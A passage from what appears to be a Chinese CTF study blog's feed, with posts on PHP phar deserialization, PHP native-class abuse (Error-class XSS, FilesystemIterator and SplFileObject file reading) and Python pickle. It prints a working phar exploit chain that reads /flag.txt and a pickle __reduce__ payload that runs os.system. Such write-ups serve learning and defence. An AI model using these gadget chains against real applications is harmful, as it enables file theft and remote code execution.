class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>) . <span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们观察一下会发现我们可以利用File类的close方法的file_get_contents来进行文件读取.我们再观察就会发现User类可以调用close函数,拿我们将<code>$db</code>赋值为File类不就可以了.但是很可惜不行.我也不知道为什么.看了一下wp发现要通过Filelist进行一步处理.wp说直接触发close实际触发的是mysql的close函数.我们将<code>$db</code>赋值为Filelist可以触发__call,我们来着重讲一讲这个方法<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这么一小段代码可真是让人汗流浃背啊。<br>首先是将<code>$func</code>传到数组funcs里。func为我们触发的不存在的函数即close。然后将files存储的内容遍历到file里再获取file的变量值。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();//这句代码进行了如下几种操作。</span><br><span class="line">调用$file对象的name()方法，获取一个名称。</span><br><span class="line">使用这个名称作为键，在$this-&gt;results数组中找到对应的子数组。</span><br><span class="line">调用$file对象上名为$func的方法。</span><br><span class="line">将该方法的返回值存储到$this-&gt;results数组的子数组中，以$func作为键。</span><br></pre></td></tr></table></figure><br>即我们只要将files赋值为对象File就可以触发colse<br>···链子<br>User-&gt;db-&gt;filelise-&gt;files-&gt;File-&gt;filename=’/flag.txt’<br>···<br>那么我们就查一个触发该链子的入口了。这时候就需要实验phar反序列化了。原因没有反序列入口。但是有文件包含函数所以我们产生使用phar反序列化。但是我们的download入口无法进行包含到我们上传的内容。我们再查看一下删除的源码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>会发现其没有waf，detele方法使用unlink来处理文件，能触发phar反序列化，那么这题就可以解了<br>exp<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置sutb</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;123123&gt;&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br>之后将文件后缀改为jpg，之后再删除页面进行phar反序列化<br><img src="/2024/03/20/%E5%88%9D%E6%8E%A2phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" class="" title="alt text"></p>
]]></content>
      <categories>
        <category>php</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>初探php原生类的利用</title>
    <url>/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="同样是因为在校赛遇到了有关php反序列化原生类的文章，所以我写下了这篇文章。"><a href="#同样是因为在校赛遇到了有关php反序列化原生类的文章，所以我写下了这篇文章。" class="headerlink" title="同样是因为在校赛遇到了有关php反序列化原生类的文章，所以我写下了这篇文章。"></a>同样是因为在校赛遇到了有关php反序列化原生类的文章，所以我写下了这篇文章。</h1><p>php原生类分为多种，如下。</p>
<h1 id="利用Error类和Exception类来实现xss漏洞。"><a href="#利用Error类和Exception类来实现xss漏洞。" class="headerlink" title="利用Error类和Exception类来实现xss漏洞。"></a>利用Error类和Exception类来实现xss漏洞。</h1><p>Error类是在php7下存在的一个内置类，是所有PHP内部错误类的基类，那这和XSS和什么关系呢？那是因为这个类中有一个内置方法，叫做__toString()的魔术方法，我们都知道当把对象当成字符串的时候它就会自动调用这个方法，而它会将Error以字符串的形式表达出来；那么假如有一个echo将它输出出来，而输出内容是我们是我们可以控制的，那我们就可以用<code>&lt;script&gt;标签来执行js代码了</code></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><img src="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/1.png" class="" title="alt text">
<img src="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/2.png" class="" title="alt text">
<img src="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/3.png" class="" title="alt text">
<p>我们可以看到其程序运行结果出现了xss漏洞。这是因为其__toString方法直接将Error中的字符串输出到了浏览器中导致的。<br>注意经过反序列化之后的在被输出时也会输出其定义的字符串。</p>
<h1 id="遍历文件目录类"><a href="#遍历文件目录类" class="headerlink" title="遍历文件目录类"></a>遍历文件目录类</h1><p>我们可以使用一下几种原生类对文件进行遍历<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DirectoryIterator </span><br><span class="line">FilesystemIterator </span><br><span class="line">GlobIterator </span><br></pre></td></tr></table></figure><br>上面三种原生类的功能相差不多都可以对目录进行遍历，当toString被触发时都会输出当前文件夹的第一文件名。一般会以遍历的形式出现在ctf赛题中。<br>在遍历时会输出该目录下的所有文件名如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$b</span>)</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$b</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><br><img src="/2024/03/11/%E5%88%9D%E6%8E%A2php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/4.png" class="" title="alt text"><br>未遍历时只会输出一个文件名。<br>可以搭配glob://协议来使用</p>
<h1 id="文件读取类"><a href="#文件读取类" class="headerlink" title="文件读取类"></a>文件读取类</h1><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>这个原生类可以对文件进行读取其使用方法仍然是触发__toString<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new SplFileObject(&#x27;/app_config.txt&#x27;);</span><br><span class="line">    echo ($a.&#x27;&lt;br&gt;&#x27;);</span><br></pre></td></tr></table></figure><br>像这样我们就可以触发SplFileObject输出文件内容<br>注意SplFileObject等原生类都需先实例化为对象再进行触发才能触发成功。</p>
<h1 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h1><p>这个类可以触发SSRF由于我对SSRF不是特别了解所以先挖个坑以后再填。</p>
]]></content>
      <categories>
        <category>php</category>
        <category>原生类</category>
      </categories>
      <tags>
        <tag>php原生类</tag>
      </tags>
  </entry>
  <entry>
    <title>初探pickle反序列化</title>
    <url>/2024/04/28/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="在打XY时遇到了pickle反序列化，但是没打出来故学习。"><a href="#在打XY时遇到了pickle反序列化，但是没打出来故学习。" class="headerlink" title="在打XY时遇到了pickle反序列化，但是没打出来故学习。"></a>在打XY时遇到了pickle反序列化，但是没打出来故学习。</h1><h1 id="什么是pickle"><a href="#什么是pickle" class="headerlink" title="什么是pickle"></a>什么是pickle</h1><p>pickle其实就是python中用于序列化和反序列化的一种模块。<br><br>其将对象序列化的结果是由一系列opcode组成的。如下<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lalala</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;dir&quot;</span>,))</span><br><span class="line">haha=lalala()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(haha,protocol=<span class="number">0</span>))</span><br><span class="line">----------------------------------------------</span><br><span class="line">cnt\nsystem\np0\n(Vdir\np1\ntp2\nRp3\n.</span><br></pre></td></tr></table></figure><br>上面的代码利用了<code>__reduce__</code>魔术方法该方法可以在被序列化时，会返回一个元组，以第一个参数为函数，第二个参数为执行的参数。<br>我们可以看到其输出值为V0协议的opcode，该协议也称为人类可读的协议版本。其实<code>__reduce__</code>也就是R关键字</p>
<h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>既然其序列化的结果为opcode那么我们想要较为深入的了解pickle反序列化就要了解一下什么是opcode</p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Opcode，全称为Operation Code，是指操作码或指令码，它是计算机体系结构中的一部分。<br>即opcode可以算较为底层的指令码。</p>
<h3 id="pickle中opcode的版本"><a href="#pickle中opcode的版本" class="headerlink" title="pickle中opcode的版本"></a>pickle中opcode的版本</h3><p>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。<br>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。<br>第 2 版协议是在 Python 2.3 中引入的。 它为 新式类 提供了更高效的封存机制。 请参考 PEP 307 了解第 2 版协议带来的改进的相关信息。<br>v3 版协议是在 Python 3.0 中引入的。 它显式地支持字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。<br>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。它是Python 3.8使用的默认协议。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。<br>第 5 版协议是在 Python 3.8 中加入的。 它增加了对带外数据的支持，并可加速带内数据处理。</p>
<h3 id="常用的opcode"><a href="#常用的opcode" class="headerlink" title="常用的opcode"></a>常用的opcode</h3><p>这里我就直接引用一个师傅的了<a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">指令</th>
<th style="text-align:center">描述</th>
<th style="text-align:right">具体写法</th>
<th style="text-align:right">栈上变化</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">c</td>
<td style="text-align:center">获取一个全局对象或import一个模块</td>
<td style="text-align:right">c[module]\n[instance]\n</td>
<td style="text-align:right">获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">(</td>
<td style="text-align:center">向栈中压入一个MARK标记</td>
<td style="text-align:right">(</td>
<td style="text-align:right">MARK标记入栈</td>
</tr>
<tr>
<td style="text-align:left">o</td>
<td style="text-align:center">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td style="text-align:right">o</td>
<td style="text-align:right">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td style="text-align:left">i</td>
<td style="text-align:center">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td style="text-align:right">i[module]\n[callable]\n</td>
<td style="text-align:right">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td style="text-align:left">N</td>
<td style="text-align:center">实例化一个None</td>
<td style="text-align:right">N</td>
<td style="text-align:right">获得的对象入栈</td>
</tr>
<tr>
<td style="text-align:left">S</td>
<td style="text-align:center">实例化一个字符串对象</td>
<td style="text-align:right">S’xxx’\n（也可以使用双引号、\’等python字符串形式）</td>
